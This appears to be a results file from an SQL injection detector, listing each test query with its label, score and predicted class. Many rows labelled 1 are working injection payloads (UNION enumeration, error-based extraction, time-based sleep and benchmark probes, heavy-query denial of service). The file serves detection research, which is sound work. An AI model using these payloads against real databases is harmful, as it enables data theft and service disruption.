Query,Label,RawMargin,Prob_Raw,Pred_Default,Pred_BestThr,BestThr,BestThr_Margin
02650843r,0,-9.263940811157227,9.477209096075967e-05,0,0,0.51,0.040005334613699206
"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1,13.382753372192383,0.9999984502792358,1,1,0.51,0.040005334613699206
SELECT option_value FROM wp_options WHERE option_name  =  'zcf_captcha_settings' LIMIT 1,0,-10.247187614440918,3.545582148944959e-05,0,0,0.51,0.040005334613699206
"1%' union all select null,null,null,null,null,null,null--",1,7.922992706298828,0.9996378421783447,1,1,0.51,0.040005334613699206
hache6,0,-5.548457145690918,0.0038783589843660593,0,0,0.51,0.040005334613699206
SELECT apartment ( s )  FROM plenty UNION ALL,0,-10.649020195007324,2.3723512640572153e-05,0,0,0.51,0.040005334613699206
SELECT * FROM consider WHERE wrote NOT LIKE 'floor%',0,-7.705418586730957,0.0004501774092204869,0,0,0.51,0.040005334613699206
"1""  )   as firv where 4522  =  4522 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,10.514508247375488,0.9999728202819824,1,1,0.51,0.040005334613699206
" select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",1,10.532279014587402,0.9999732971191406,1,1,0.51,0.040005334613699206
"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468",1,11.926774024963379,0.9999934434890747,1,1,0.51,0.040005334613699206
24n1e39,0,-6.369372367858887,0.0017103040590882301,0,0,0.51,0.040005334613699206
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'ctbs' like 'ctbs",1,8.522719383239746,0.9998012185096741,1,1,0.51,0.040005334613699206
SELECT prepare ( s FROM shade RIGHT JOIN,0,-8.776044845581055,0.00015436367539223284,0,0,0.51,0.040005334613699206
"INSERT INTO wool ( vapor, frog, ranch, nodded, war, angry )  VALUES  ( 'mother', 'yourself'. thy', 'call', 'depend', 'thou', 'particles' )  ",0,-7.788054943084717,0.00041448677075095475,0,0,0.51,0.040005334613699206
"1  )   as rnfb where 2405  =  2405 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,13.496248245239258,0.9999985694885254,1,1,0.51,0.040005334613699206
knio,0,-4.758330821990967,0.008506929501891136,0,0,0.51,0.040005334613699206
"-8069   )    )    as sxbn where 7689  =  7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",1,12.116957664489746,0.9999945163726807,1,1,0.51,0.040005334613699206
end and    (    (   '%'  =  ',1,11.446487426757812,0.9999892711639404,1,1,0.51,0.040005334613699206
" SELECT column_name ( s )  FROM goes,differ",0,-10.331982612609863,3.257338175899349e-05,0,0,0.51,0.040005334613699206
casanellas berlingery,0,-11.672459602355957,8.525335942977108e-06,0,0,0.51,0.040005334613699206
DELETE FROM hunter,0,-12.116790771484375,5.466913989948807e-06,0,0,0.51,0.040005334613699206
kofoed@serviconlevante.mr,0,-9.50920581817627,7.416042353725061e-05,0,0,0.51,0.040005334613699206
SELECT small ( s )  FROM force LEFT JOIN,0,-9.258722305297852,9.52679110923782e-05,0,0,0.51,0.040005334613699206
calle ecuador 143,0,-9.458507537841797,7.801686297170818e-05,0,0,0.51,0.040005334613699206
slezak@ballerpoker.kn,0,-9.032224655151367,0.00011948209430556744,0,0,0.51,0.040005334613699206
SELECT * FROM worry WHERE engine BETWEEN 'struggle' AND 'activity',0,-14.330707550048828,5.973825523142295e-07,0,0,0.51,0.040005334613699206
"-5744  )   union all select 3617,3617,3617,3617,3617,3617--",1,13.617137908935547,0.9999988079071045,1,1,0.51,0.040005334613699206
1 where 4003  =  4003 union all select null--,1,10.91045093536377,0.9999817609786987,1,1,0.51,0.040005334613699206
if  (  4194  =  4133  )   select 4194 else drop function tqhz--,1,7.976071357727051,0.9996565580368042,1,1,0.51,0.040005334613699206
-8015  )   where 9808  =  9808 or 9323  =  9323#,1,11.281864166259766,0.9999873638153076,1,1,0.51,0.040005334613699206
1  )   where 5629  =  5629,1,9.405494689941406,0.99991774559021,1,1,0.51,0.040005334613699206
SELECT TOP 3 * FROM examine SELECT * FROM chair 3SELECT * FROM scientist,0,-12.96651840209961,2.337284740860923e-06,0,0,0.51,0.040005334613699206
"SELECT * FROM forward WHERE gravity BETWEEN ""highway"" AND    ""happened""",0,-13.402129173278809,1.5119193221835303e-06,0,0,0.51,0.040005334613699206
"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ireg' like 'ireg",1,8.785112380981445,0.9998470544815063,1,1,0.51,0.040005334613699206
5.77313E+14,0,-8.801640510559082,0.00015046335465740412,0,0,0.51,0.040005334613699206
"1%""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""%""  =  """,1,8.230169296264648,0.9997336268424988,1,1,0.51,0.040005334613699206
SELECT TOP 3 * FROM harder WHERE today = 'poet',0,-11.318978309631348,1.2140174476371612e-05,0,0,0.51,0.040005334613699206
litago,0,-4.914506912231445,0.007285862695425749,0,0,0.51,0.040005334613699206
1'+  (  select lqhd where 4251  =  4251 and   (  8754  =  5779  )  *5779  )  +',1,12.624791145324707,0.9999966621398926,1,1,0.51,0.040005334613699206
SELECT * FROM discover FETCH FIRST 3 ROWS ONLY,0,-12.08391284942627,5.649641025229357e-06,0,0,0.51,0.040005334613699206
"1""  )   as ckoi where 4674  =  4674 union all select null,null,null,null,null,null,null,null,null,null#",1,8.364396095275879,0.999767005443573,1,1,0.51,0.040005334613699206
9639,0,-7.25226354598999,0.0007080669165588915,0,0,0.51,0.040005334613699206
SELECT TOP 50 PERCENT * FROM decide SELECT * FROM unhappy FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM about,0,-9.680502891540527,6.248616409720853e-05,0,0,0.51,0.040005334613699206
2.77767E+15,0,-8.801640510559082,0.00015046335465740412,0,0,0.51,0.040005334613699206
"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # kfza",1,11.768253326416016,0.9999922513961792,1,1,0.51,0.040005334613699206
"INSERT INTO we  ( parts, held, gasoline )  VALUES  ( 'diameter', 'police', 'doll' )  ",0,-9.99976921081543,4.5408345613395795e-05,0,0,0.51,0.040005334613699206
SELECT * FROM social WHERE globe = 'give' FETCH FIRST 3 ROWS ONLY,0,-15.089346885681152,2.797562501655193e-07,0,0,0.51,0.040005334613699206
"SELECT WEEKDAY ( ""2017-01-01"" ) ;",0,-7.116251468658447,0.0008111456409096718,0,0,0.51,0.040005334613699206
boys@muebetuweb.mu,0,-9.89550495147705,5.0398190069245175e-05,0,0,0.51,0.040005334613699206
" SELECT column_name ( s )  FROM so,giant",0,-9.718534469604492,6.015448161633685e-05,0,0,0.51,0.040005334613699206
humaina,0,-5.43983793258667,0.0043214308097958565,0,0,0.51,0.040005334613699206
e5670cij3,0,-8.747469902038574,0.00015883753076195717,0,0,0.51,0.040005334613699206
"1'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,12.80119800567627,0.9999972581863403,1,1,0.51,0.040005334613699206
1'   )    )    and 4242  =  5831 and    (    (   'xflh' like 'xflh,1,13.993386268615723,0.9999991655349731,1,1,0.51,0.040005334613699206
"   SELECT COUNT ( open ) , battle FROM several BY direct",0,-11.34063720703125,1.188006172014866e-05,0,0,0.51,0.040005334613699206
kinsey@etnics.fm,0,-5.346325874328613,0.0047430251725018024,0,0,0.51,0.040005334613699206
SELECT * FROM did WHERE wood BETWEEN west09/01/1996stomach AND doing15/31/1996manner,0,-13.173641204833984,1.9000258362211753e-06,0,0,0.51,0.040005334613699206
" SELECT * FROM average ORDER BY sure, find",0,-12.034235000610352,5.9373901422077324e-06,0,0,0.51,0.040005334613699206
 or   (  EXISTS  ) ,1,6.586825847625732,0.9986234903335571,1,1,0.51,0.040005334613699206
38747118f,0,-9.263940811157227,9.477209096075967e-05,0,0,0.51,0.040005334613699206
18708,0,-7.913724422454834,0.00036555639235302806,0,0,0.51,0.040005334613699206
SELECT TOP 3 * FROM replied WHERE fill = 'ordinary',0,-10.505941390991211,2.737258000706788e-05,0,0,0.51,0.040005334613699206
SELECT COUNT ( cage ) FROM football,0,-11.449472427368164,1.0654981451807544e-05,0,0,0.51,0.040005334613699206
SELECT * FROM body WHERE canal BETWEEN useful09/01/1996mind AND mountain15/31/1996thing,0,-13.13969898223877,1.9656235963338986e-06,0,0,0.51,0.040005334613699206
guinea hinojar,0,-8.861528396606445,0.00014171817747410387,0,0,0.51,0.040005334613699206
SELECT * FROM rush WHERE car = 'cowboy' FETCH FIRST 3 ROWS ONLY,0,-14.587090492248535,4.6228188921304536e-07,0,0,0.51,0.040005334613699206
"INSERT INTO stay  ( caught, mainly, find )  VALUES  ( 'model', 'mean', 'giving' )  ",0,-10.01671028137207,4.464559242478572e-05,0,0,0.51,0.040005334613699206
SELECT COUNT ( continent ) FROM crack,0,-11.354151725769043,1.1720590009645093e-05,0,0,0.51,0.040005334613699206
pandora,0,-5.43983793258667,0.0043214308097958565,0,0,0.51,0.040005334613699206
SELECT AVG ( setting ) FROM than,0,-10.424123764038086,2.9706239729421213e-05,0,0,0.51,0.040005334613699206
coripe,0,-4.914506912231445,0.007285862695425749,0,0,0.51,0.040005334613699206
brincones,0,-5.873077392578125,0.002806302160024643,0,0,0.51,0.040005334613699206
SELECT * FROM bound WHERE did BETWEEN 'began' AND 'inch',0,-13.72217845916748,1.0978250202242634e-06,0,0,0.51,0.040005334613699206
SELECT AVG ( four ) FROM canal,0,-9.973602294921875,4.661217099055648e-05,0,0,0.51,0.040005334613699206
"1""   )    )   ",1,6.248930931091309,0.9980712532997131,1,1,0.51,0.040005334613699206
h?ele77,0,-7.013216495513916,0.0008991002687253058,0,0,0.51,0.040005334613699206
SELECT compound ( s )  FROM press UNION,0,-7.943371772766113,0.0003548814856912941,0,0,0.51,0.040005334613699206
SELECT look ( s FROM mostly RIGHT JOIN,0,-11.057010650634766,1.5775911379023455e-05,0,0,0.51,0.040005334613699206
" SELECT * FROM change ORDER BY labor ASC, especially DESC",0,-12.276026725769043,4.662161700252909e-06,0,0,0.51,0.040005334613699206
birney-warbeck@lamejorplaya.gl,0,-11.39770793914795,1.1221048225706909e-05,0,0,0.51,0.040005334613699206
1'   )    )    and 4595  =  4595#,1,12.402470588684082,0.9999959468841553,1,1,0.51,0.040005334613699206
SELECT COUNT ( machinery ) FROM unknown,0,-10.576210975646973,2.5515191737213172e-05,0,0,0.51,0.040005334613699206
1'||  (  select 'bifa' where 6077  =  6077 and 4547  =  9301,1,14.436531066894531,0.9999994039535522,1,1,0.51,0.040005334613699206
"-2373%""  )   or 9323  =  9323#",1,12.023750305175781,0.9999940395355225,1,1,0.51,0.040005334613699206
azuqueca de henares,0,-13.092246055603027,2.0611464606190566e-06,0,0,0.51,0.040005334613699206
SELECT came ( s )  FROM seed SELECT tobacco FROM sick,0,-15.009116172790527,3.0312625654005387e-07,0,0,0.51,0.040005334613699206
"1"" where 7015  =  7015",1,7.970870494842529,0.9996547698974609,1,1,0.51,0.040005334613699206
6703,0,-7.338615894317627,0.0006495273555628955,0,0,0.51,0.040005334613699206
victoria,0,-4.962100982666016,0.006949575152248144,0,0,0.51,0.040005334613699206
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_1_link' LIMIT 1,0,-8.474970817565918,0.00020858176867477596,0,0,0.51,0.040005334613699206
"  SELECT SUBTIME ( ""2017-06-15 10:24:21.000004"", ""5.000001"" ) ;",0,-6.933718204498291,0.0009734226623550057,0,0,0.51,0.040005334613699206
SELECT * FROM earn,0,-10.162569999694824,3.8586484151892364e-05,0,0,0.51,0.040005334613699206
cervantes,0,-5.873077392578125,0.002806302160024643,0,0,0.51,0.040005334613699206
invo3unta6i5,0,-7.177291393280029,0.0007631508633494377,0,0,0.51,0.040005334613699206
SELECT COUNT ( ill ) FROM thing,0,-10.26945972442627,3.4674903872655705e-05,0,0,0.51,0.040005334613699206
"   SELECT COUNT ( using ) , instrument FROM breeze BY widely",0,-11.415193557739258,1.1026549145753961e-05,0,0,0.51,0.040005334613699206
ardevol herrador,0,-11.927352905273438,6.607140676351264e-06,0,0,0.51,0.040005334613699206
"  SELECT STR_TO_DATE ( ""August,5,2017"", ""%M %e %Y"" ) ;",0,-2.956397294998169,0.049435023218393326,0,0,0.51,0.040005334613699206
"1%' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '%'  =  '",1,13.243186950683594,0.9999982118606567,1,1,0.51,0.040005334613699206
lo7ange,0,-5.156252861022949,0.0057302298955619335,0,0,0.51,0.040005334613699206
 (  select   (  case when   (  5603  =  5603  )   then 5603 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,1,6.9161224365234375,0.9990092515945435,1,1,0.51,0.040005334613699206
"1""   )    )    as rcse where 4559  =  4559 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1,13.07735538482666,0.9999978542327881,1,1,0.51,0.040005334613699206
SELECT AVG ( shirt ) FROM cave,0,-9.973602294921875,4.661217099055648e-05,0,0,0.51,0.040005334613699206
"  SELECT Orders.paintrID, Employees.friend, Employees.opportunity FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.feltID ORDER BY Orders.totalID",0,-10.218828201293945,3.647568519227207e-05,0,0,0.51,0.040005334613699206
"1%""   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """,1,10.722575187683105,0.9999779462814331,1,1,0.51,0.040005334613699206
"roure, 43, 3?d",0,-5.001543045043945,0.006682600360363722,0,0,0.51,0.040005334613699206
4ip7237o8h2dira,0,-5.763854026794434,0.003129167715087533,0,0,0.51,0.040005334613699206
manquel,0,-5.43983793258667,0.0043214308097958565,0,0,0.51,0.040005334613699206
"benchmark  (  10000000,MD5  (  1   )    )   #",1,9.204890251159668,0.9998995065689087,1,1,0.51,0.040005334613699206
alberite de san juan,0,-14.236778259277344,6.562140697496943e-07,0,0,0.51,0.040005334613699206
SELECT TOP 3 * FROM whether WHERE spend = 'space',0,-11.142449378967285,1.448403054382652e-05,0,0,0.51,0.040005334613699206
SELECT COUNT ( DISTINCT hide )  FROM block,0,-10.376117706298828,3.116705920547247e-05,0,0,0.51,0.040005334613699206
"  SELECT sand,baseball,rock FROM tears LEFT JOIN Orders ON book.environmentID =  any.got ORDER BY shelf.aloud",0,-9.152098655700684,0.00010598588414723054,0,0,0.51,0.040005334613699206
torremoroso enrich,0,-13.498929977416992,1.3724250038649188e-06,0,0,0.51,0.040005334613699206
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  'wweo'  =  'wweo",1,11.373879432678223,0.9999885559082031,1,1,0.51,0.040005334613699206
SELECT * FROM  ( SELECT troops FROM farm ) ,0,-13.06068229675293,2.1272417143336497e-06,0,0,0.51,0.040005334613699206
fowley5@virginislands.com.eg,0,-8.44232177734375,0.00021550265955738723,0,0,0.51,0.040005334613699206
SELECT sugar FROM imagine UNION ALL SELECT pull FROM composition ORDER BY die,0,-9.694043159484863,6.164584192447364e-05,0,0,0.51,0.040005334613699206
"1%""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""%""  =  """,1,9.38217544555664,0.9999158382415771,1,1,0.51,0.040005334613699206
SELECT * FROM swing WHERE cross = 'straight',0,-10.764344215393066,2.1139539967407472e-05,0,0,0.51,0.040005334613699206
SELECT number ( s )  FROM here FULL OUTER JOIN,0,-10.709153175354004,2.2339023416861892e-05,0,0,0.51,0.040005334613699206
"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",1,14.283164024353027,0.9999994039535522,1,1,0.51,0.040005334613699206
fantaseadora,0,-7.223648548126221,0.0007286060135811567,0,0,0.51,0.040005334613699206
-4137   )    )    as elxu where 5672  =  5672 order by 1--,1,12.945161819458008,0.999997615814209,1,1,0.51,0.040005334613699206
"  SELECT pet,buried FROM ride WHERE anyone = 'wonder' UNION SELECT leaf, interest FROM bridge",0,-10.09523868560791,4.127391002839431e-05,0,0,0.51,0.040005334613699206
1%'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  '%'  =  ',1,13.454947471618652,0.9999985694885254,1,1,0.51,0.040005334613699206
"1  )   where 1415  =  1415 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,11.863085746765137,0.9999929666519165,1,1,0.51,0.040005334613699206
"INSERT INTO loose  ( exercise, struck, chosen )  VALUES  ( 'yet', 'importance', 'tomorrow' )  ",0,-9.359580993652344,8.612876263214275e-05,0,0,0.51,0.040005334613699206
"""hi""""  )   or   (  """"a""""  =  """"a""",1,7.644150257110596,0.9995213747024536,1,1,0.51,0.040005334613699206
"1   )    )    as henn where 9980  =  9980 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,12.269726753234863,0.9999953508377075,1,1,0.51,0.040005334613699206
"-3505""  )   where 2340  =  2340 or 9323  =  9323#",1,10.976174354553223,0.9999829530715942,1,1,0.51,0.040005334613699206
mendracaveitia torreyas,0,-13.452306747436523,1.4379268122866051e-06,0,0,0.51,0.040005334613699206
&apos; OR,1,8.762116432189941,0.9998434782028198,1,1,0.51,0.040005334613699206
SELECT AVG ( together ) FROM youth SELECT SUM ( tight ) ,0,-11.977429389953613,6.284428309299983e-06,0,0,0.51,0.040005334613699206
56702228y,0,-9.263940811157227,9.477209096075967e-05,0,0,0.51,0.040005334613699206
" SELECT column_name ( s )  FROM silver,pot",0,-10.331982612609863,3.257338175899349e-05,0,0,0.51,0.040005334613699206
"1'||  (  select 'nfgq' where 1837  =  1837 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,10.480667114257812,0.999971866607666,1,1,0.51,0.040005334613699206
SELECT relationship ( s )  FROM production SELECT almost FROM wall,0,-15.205684661865234,2.490318706804828e-07,0,0,0.51,0.040005334613699206
"1'  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,14.327880859375,0.9999994039535522,1,1,0.51,0.040005334613699206
"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,8.139239311218262,0.9997082352638245,1,1,0.51,0.040005334613699206
"1 where 6119  =  6119 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,10.203299522399902,0.9999629259109497,1,1,0.51,0.040005334613699206
"1"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,13.550350189208984,0.9999986886978149,1,1,0.51,0.040005334613699206
SELECT * FROM steep 3 SELECT * FROM dangerous,0,-12.30984115600586,4.507149697019486e-06,0,0,0.51,0.040005334613699206
tyler,0,-4.80619478225708,0.008112571202218533,0,0,0.51,0.040005334613699206
closa ortell,0,-7.123929023742676,0.000804946874268353,0,0,0.51,0.040005334613699206
"alfalfa 47,",0,-10.408124923706055,3.0185312425601296e-05,0,0,0.51,0.040005334613699206
"1"" and sleep  (  5  )  #",1,7.479499340057373,0.9994357228279114,1,1,0.51,0.040005334613699206
SELECT * FROM Products;,0,-14.009101867675781,8.239939575105382e-07,0,0,0.51,0.040005334613699206
7106,0,-7.338615894317627,0.0006495273555628955,0,0,0.51,0.040005334613699206
SELECT kill ( s )  FROM lamp SELECT am FROM lay,0,-11.2569580078125,1.2916939340357203e-05,0,0,0.51,0.040005334613699206
SELECT * FROM nothing FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM club,0,-13.063448905944824,2.121364559570793e-06,0,0,0.51,0.040005334613699206
"1'+  (  select 'epza' where 8994  =  8994 and make_set  (  3782  =  2428,2428   )    )   +'",1,13.265869140625,0.9999982118606567,1,1,0.51,0.040005334613699206
SELECT * FROM whole ORDER BY night DESC,0,-10.543733596801758,2.635743840073701e-05,0,0,0.51,0.040005334613699206
SELECT Count ( * )  AS noon,0,-9.000402450561523,0.0001233449438586831,0,0,0.51,0.040005334613699206
1'   )    )     )   union all select null--,1,10.653678894042969,0.999976396560669,1,1,0.51,0.040005334613699206
1g5ota323,0,-8.747469902038574,0.00015883753076195717,0,0,0.51,0.040005334613699206
3041,0,-2.322270154953003,0.08929527550935745,0,0,0.51,0.040005334613699206
1.72E+15,0,-6.071242332458496,0.002302987966686487,0,0,0.51,0.040005334613699206
SELECT about FROM together UNION SELECT tool FROM opinion ORDER BY series,0,-12.340874671936035,4.369424914330011e-06,0,0,0.51,0.040005334613699206
90946866j,0,-9.263940811157227,9.477209096075967e-05,0,0,0.51,0.040005334613699206
"1""  )   as yphz where 8174  =  8174 union all select null,null,null,null,null,null,null--",1,7.383978843688965,0.9993792772293091,1,1,0.51,0.040005334613699206
"1',  (  select   (  case when   (  3576  =  7744  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,8.41276741027832,0.9997780919075012,1,1,0.51,0.040005334613699206
1   )    )     )   order by 1#,1,10.063037872314453,0.9999573230743408,1,1,0.51,0.040005334613699206
SELECT * FROM unless WHERE    NOT fine = 'comfortable',0,-10.427331924438477,2.9611092031700537e-05,0,0,0.51,0.040005334613699206
select   (  case when   (  6287  =  8341  )   then 6287 else 1/  (  select 0  )   end  )  --,1,10.610079765319824,0.999975323677063,1,1,0.51,0.040005334613699206
" select * from users where id  =  1 or ""?["" or 1  =  1 -- 1",1,8.746728897094727,0.9998409748077393,1,1,0.51,0.040005334613699206
c356conio,0,-7.727468490600586,0.00044036400504410267,0,0,0.51,0.040005334613699206
SELECT MIN ( could )  AS which FROM extra,0,-11.242990493774414,1.3098620911478065e-05,0,0,0.51,0.040005334613699206
SELECT * FROM group,0,-10.048968315124512,4.322846143622883e-05,0,0,0.51,0.040005334613699206
"ondulada, 121",0,-8.061712265014648,0.00031528688850812614,0,0,0.51,0.040005334613699206
SELECT opinion FROM difficult UNION ALL SELECT see FROM court ORDER BY realize,0,-9.854984283447266,5.248218803899363e-05,0,0,0.51,0.040005334613699206
SELECT * FROM particularly WHERE price = 'railroad'  OR identity = 'noted',0,-12.544635772705078,3.5639561701827915e-06,0,0,0.51,0.040005334613699206
"1"" where 7245  =  7245 and 9198  =  9198--",1,11.598417282104492,0.9999908208847046,1,1,0.51,0.040005334613699206
" select * from users where id  =  '1' union select \.,@@VERSION -- 1'",1,8.717840194702148,0.9998363256454468,1,1,0.51,0.040005334613699206
SELECT * FROM running WHERE song = 'window'  AND  ( deeply = 'slight' OR exciting = 'sale' ) ,0,-10.964272499084473,1.730889744067099e-05,0,0,0.51,0.040005334613699206
SELECT * FROM offer WHERE ancient = 'thin'  OR bear = 'basket',0,-11.94935131072998,6.46338321530493e-06,0,0,0.51,0.040005334613699206
persaud,0,-5.43983793258667,0.0043214308097958565,0,0,0.51,0.040005334613699206
"1' where 7688  =  7688 union all select null,null,null,null,null,null,null,null,null--",1,7.540820598602295,0.9994693398475647,1,1,0.51,0.040005334613699206
"   SELECT share, spider, plates FROM easy WHERE making  IS NULL",0,-12.204324722290039,5.008722382626729e-06,0,0,0.51,0.040005334613699206
SELECT * FROM mirror 3 SELECT * FROM pleasant,0,-12.30984115600586,4.507149697019486e-06,0,0,0.51,0.040005334613699206
33120,0,-7.913724422454834,0.00036555639235302806,0,0,0.51,0.040005334613699206
4.79764E+15,0,-8.801640510559082,0.00015046335465740412,0,0,0.51,0.040005334613699206
indiestro,0,-5.873077392578125,0.002806302160024643,0,0,0.51,0.040005334613699206
-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,1,9.03095531463623,0.999880313873291,1,1,0.51,0.040005334613699206
SELECT * FROM measure WHERE too = 'beginning' FETCH FIRST 3 ROWS ONLY,0,-15.248513221740723,2.3859138309489936e-07,0,0,0.51,0.040005334613699206
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  'egnv' like 'egnv",1,9.659015655517578,0.9999361038208008,1,1,0.51,0.040005334613699206
"-7329""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""borw"" like ""borw",1,11.781230926513672,0.9999923706054688,1,1,0.51,0.040005334613699206
-4215  )   where 5782  =  5782 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,9.922514915466309,0.9999508857727051,1,1,0.51,0.040005334613699206
gaile,0,-4.80619478225708,0.008112571202218533,0,0,0.51,0.040005334613699206
SELECT SIGN ( -12 ) ;,0,-7.4785590171813965,0.0005647520301863551,0,0,0.51,0.040005334613699206
SELECT * FROM difficult WHERE sick LIKE '%serve%',0,-9.803424835205078,5.5258951761061326e-05,0,0,0.51,0.040005334613699206
"   SELECT class, fast, offer FROM beside WHERE arrive  IS NULL",0,-11.803621292114258,7.477374310838059e-06,0,0,0.51,0.040005334613699206
leocricia,0,-5.873077392578125,0.002806302160024643,0,0,0.51,0.040005334613699206
" SELECT * FROM took ORDER BY shelf, share",0,-11.89411735534668,6.830421625636518e-06,0,0,0.51,0.040005334613699206
"  SELECT ADDTIME ( ""2017-06-15   09:34:21.000001"", ""5 2:10:5.000003"" ) ;",0,-6.32452917098999,0.0017886048881337047,0,0,0.51,0.040005334613699206
"-9160'  )   union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",1,14.113845825195312,0.9999992847442627,1,1,0.51,0.040005334613699206
FROM  ( SELECT DISTINCT magnet FROM stone ) ,0,-10.587068557739258,2.523966395528987e-05,0,0,0.51,0.040005334613699206
de_souza,0,-7.528285026550293,0.0005373705644160509,0,0,0.51,0.040005334613699206
